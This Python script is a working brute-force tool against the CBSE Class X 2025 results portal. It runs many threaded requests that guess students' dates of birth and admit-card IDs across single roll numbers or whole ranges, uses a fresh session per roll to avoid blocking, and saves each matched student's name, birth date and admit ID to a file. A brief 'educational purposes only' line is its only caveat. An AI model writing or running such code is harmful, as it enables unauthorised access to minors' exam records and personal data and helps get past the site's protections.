import requests
import string
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

URL = "https://cbseresults.nic.in/class_x_jh_2025/ClassTenth_po_2025.asp"
HEADERS = {
    "Host": "cbseresults.nic.in",
    "Referer": "https://cbseresults.nic.in/class_x_jh_2025/ClassTenth_po_2025.htm",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}
EXPRESSION = "ENGLISH"


def iterate_dobs(start_year, end_year):
    """Generate dates between start and end year"""
    start = datetime(start_year, 1, 1)
    end = datetime(end_year, 12, 31)
    delta = timedelta(days=1)
    while start <= end:
        yield start.strftime("%d/%m/%Y")
        start += delta


def brute(session, admid, regno, dob, sch, cno):
    """Attempt a single combination"""
    data = {
        'regno': regno,
        'sch': sch,
        'cno': cno,
        'admid': admid,
        'dob': dob,
        'B2': 'Submit',
    }
    try:
        r = session.post(URL, data=data, timeout=15)
        return r.text if EXPRESSION in r.text else None
    except requests.RequestException as e:
        return None


def generate_admit_id(prefix, regno, sch, cno):
    """
    Generate admit ID based on CBSE pattern
    Format: XX + RollLast2 + SchoolPrefix + CentreCode
    """
    if len(regno) < 2:
        return None
    
    # Take last 2 digits of roll number
    roll_last2 = regno[-2:].zfill(2)
    
    # School prefix (first 2 characters)
    sch_prefix = sch[:2] if sch and len(sch) >= 2 else "00"
    
    # Centre code (ensure 2 digits)
    centre_code = cno.zfill(2) if len(cno) <= 2 else cno[:2]
    
    return f"{prefix}{roll_last2}{sch_prefix}{centre_code}"


def build_tasks(regno, sch, cno, prefixes, dob_list):
    """Build task list with validation"""
    tasks = []
    
    for dob, prefix in product(dob_list, prefixes):
        if len(prefix) == 2 and prefix.isalpha():
            admid = generate_admit_id(prefix, regno, sch, cno)
            if admid and len(admid) >= 6:  # Basic validation
                tasks.append((dob, admid))
    
    return tasks


def find_valid(session, tasks, regno, sch, cno, log_every, max_workers=20):
    """Find valid combination using thread pool"""
    attempt = 0
    successful_attempt = 0
    
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(brute, session, admid, regno, dob, sch, cno): (dob, admid, attempt)
            for attempt, (dob, admid) in enumerate(tasks, 1)
        }
        
        for fut in as_completed(futures):
            dob, admid, task_attempt = futures[fut]
            attempt += 1
            successful_attempt = task_attempt
            
            if log_every:
                print(f"Attempt {attempt}: Roll={regno}, School={sch}, Centre={cno}, AdmitID={admid}, DOB={dob}")
            else:
                if attempt % 100 == 0:
                    print(f"Roll {regno}: Tried {attempt:,} combinations…", end='\r')
            
            html = fut.result()
            if html:
                pool.shutdown(wait=False, cancel_futures=True)
                if not log_every:
                    print()
                return html, dob, admid, successful_attempt
    
    if not log_every and attempt > 0:
        print()
    
    return None, None, None, attempt


def parse_candidate_name(html):
    """Extract candidate name from HTML response"""
    soup = BeautifulSoup(html, 'html.parser')
    
    # Multiple possible patterns for candidate name
    patterns = [
        lambda tag: tag.name == 'td' and 'Candidate Name' in tag.text,
        lambda tag: tag.name == 'td' and 'Name of Candidate' in tag.text,
        lambda tag: tag.name == 'b' and 'Candidate Name' in tag.text,
    ]
    
    for pattern in patterns:
        label_td = soup.find(pattern)
        if label_td:
            name_td = label_td.find_next_sibling('td')
            if name_td:
                return name_td.get_text(strip=True)
    
    return "Unknown"


def sanitize_filename(name):
    """Sanitize filename to be filesystem-safe"""
    return "".join(c for c in name if c.isalnum() or c in (' ', '_', '-')).rstrip().replace(' ', '_')


def validate_inputs(rolls, sch, cno, dob_list):
    """Validate all inputs before processing"""
    errors = []
    
    # Validate roll numbers
    for roll in rolls:
        if not roll.isdigit():
            errors.append(f"❌ Roll number must be numeric: {roll}")
        if len(roll) < 3:
            errors.append(f"❌ Roll number too short (min 3 digits): {roll}")
    
    # Validate school code
    if not sch or not sch.isdigit():
        errors.append("❌ School code must be numeric")
    elif len(sch) < 2:
        errors.append("❌ School code too short")
    
    # Validate centre code
    if not cno or not cno.isdigit():
        errors.append("❌ Centre code must be numeric")
    
    # Validate DOB list
    if not dob_list:
        errors.append("❌ No valid dates of birth provided")
    
    return errors


def process_roll(regno, sch, cno, prefixes, dob_list, log_every):
    """Process a single roll number"""
    tasks = build_tasks(regno, sch, cno, prefixes, dob_list)
    
    if not tasks:
        print(f"❌ Roll {regno}: No valid tasks generated")
        return None, None, None, 0
    
    print(f"[+] Roll {regno}: {len(tasks):,} combinations")
    
    # Create new session for each roll to avoid blocking
    session = requests.Session()
    session.headers.update(HEADERS)
    session.timeout = 15
    
    return find_valid(session, tasks, regno, sch, cno, log_every)


def load_prefixes(fi, si):
    """Load prefixes based on user input"""
    alpha = string.ascii_uppercase
    
    if fi and si:
        return [fi + si]
    elif fi:
        return [fi + x for x in alpha]
    elif si:
        return [x + si for x in alpha]
    else:
        # Try to load from file, fallback to all combinations
        if os.path.exists('wl.txt'):
            try:
                with open('wl.txt', 'r', encoding='utf-8') as f:
                    prefixes = [line.strip().upper() for line in f if line.strip()]
                    if prefixes:
                        return prefixes
            except Exception as e:
                print(f"⚠️  Could not read wl.txt: {e}")
        
        # Fallback to all 2-letter combinations
        return [a + b for a in alpha for b in alpha]


def main():
    """Main function with improved error handling"""
    try:
        print("=== CBSE Results Finder ===")
        print("Note: This tool is for educational purposes only\n")
        
        # Input mode
        mode = input("Use fixed roll number or range? (fixed/range): ").strip().lower()
        
        if mode == 'range':
            start_roll = input("Enter start Roll Number: ").strip()
            end_roll = input("Enter end Roll Number: ").strip()
            
            # Validate range
            if not start_roll.isdigit() or not end_roll.isdigit():
                print("❌ Roll numbers must be numeric")
                return
            
            if int(start_roll) > int(end_roll):
                print("❌ Start roll must be less than or equal to end roll")
                return
            
            # Fixed DOB for range mode
            dob_input = input("Enter fixed Date of Birth (DD/MM/YYYY): ").strip()
            try:
                datetime.strptime(dob_input, "%d/%m/%Y")
                dob_list = [dob_input]
            except ValueError:
                print("❌ Invalid date format. Use DD/MM/YYYY.")
                return
            
            # Generate roll numbers with same length as start_roll
            roll_length = len(start_roll)
            rolls = [str(r).zfill(roll_length) for r in range(int(start_roll), int(end_roll) + 1)]
            
        else:  # fixed mode
            roll = input("Enter Roll Number: ").strip()
            rolls = [roll]
            
            dob_input = input("Enter Date of Birth (DD/MM/YYYY) [leave blank to brute]: ").strip()
            if dob_input:
                try:
                    datetime.strptime(dob_input, "%d/%m/%Y")
                    dob_list = [dob_input]
                except ValueError:
                    print("❌ Invalid date format. Use DD/MM/YYYY.")
                    return
            else:
                start_year = int(input("Start year for brute (e.g., 2008): ").strip())
                end_year = int(input("End year for brute (e.g., 2009): ").strip())
                
                if start_year > end_year:
                    print("❌ Start year must be less than or equal to end year")
                    return
                
                dob_list = list(iterate_dobs(start_year, end_year))
        
        # Additional inputs
        sch = input("Enter your School Code: ").strip()
        cno = input("Enter middle two digits of Centre Code (eg for 816077, will be 60): ").strip()
        
        log_pref = input("Log every attempt? (yes/no) [no]: ").strip().lower()
        log_every = log_pref in ('yes', 'y')
        
        # Prefix handling
        fi = input("First initial [A–Z, blank=any]: ").upper().strip()
        si = input("Second initial [A–Z, blank=any]: ").upper().strip()
        prefixes = load_prefixes(fi, si)
        
        print(f"\n[*] Loaded {len(prefixes):,} prefix combinations")
        print(f"[*] Processing {len(rolls):,} roll number(s)")
        print(f"[*] Using {len(dob_list):,} date(s) of birth")
        
        # Validate all inputs
        errors = validate_inputs(rolls, sch, cno, dob_list)
        if errors:
            for error in errors:
                print(error)
            return
        
        # Process each roll
        success_count = 0
        for i, regno in enumerate(rolls, 1):
            print(f"\n--- Processing Roll {i}/{len(rolls)}: {regno} ---")
            
            html, used_dob, used_admid, attempts = process_roll(regno, sch, cno, prefixes, dob_list, log_every)
            
            if html:
                candidate = parse_candidate_name(html)
                if candidate == "Unknown":
                    print("⚠️  Could not extract candidate name from response")
                    candidate = f"Roll_{regno}"
                
                # Create unique filename
                base_name = sanitize_filename(candidate)
                fname = f"{base_name}_{regno}.txt"
                counter = 1
                while os.path.exists(fname):
                    fname = f"{base_name}_{regno}_{counter}.txt"
                    counter += 1
                
                # Save results
                with open(fname, 'w', encoding='utf-8') as f:
                    f.write(f"Candidate Name : {candidate}\n")
                    f.write(f"Roll No        : {regno}\n")
                    f.write(f"Date of Birth  : {used_dob}\n")
                    f.write(f"Admit Card ID  : {used_admid}\n")
                    f.write(f"Attempts       : {attempts}\n")
                    f.write(f"Found on       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("\n---\n")
                    f.write("by https://github.com/Soapdevs\n")
                    f.write("follow https://instagram.com/rmps_memes\n")
                
                print(f"✅ Success! Saved details for {candidate} in {fname}")
                print(f"📊 Found after {attempts:,} attempts")
                success_count += 1
                
                # Ask if user wants to continue for range mode
                if mode == 'range' and i < len(rolls):
                    cont = input(f"Continue with next {len(rolls) - i} rolls? (yes/no) [yes]: ").strip().lower()
                    if cont in ('no', 'n'):
                        break
            else:
                print(f"❌ No valid combination found for roll {regno} after {attempts:,} attempts")
        
        print(f"\n=== Summary ===")
        print(f"Processed: {len(rolls):,} roll(s)")
        print(f"Success: {success_count:,}")
        print(f"Failed: {len(rolls) - success_count:,}")
        
    except KeyboardInterrupt:
        print("\n\n⚠️  Operation cancelled by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        print("Please check your inputs and try again")


if __name__ == '__main__':
    main()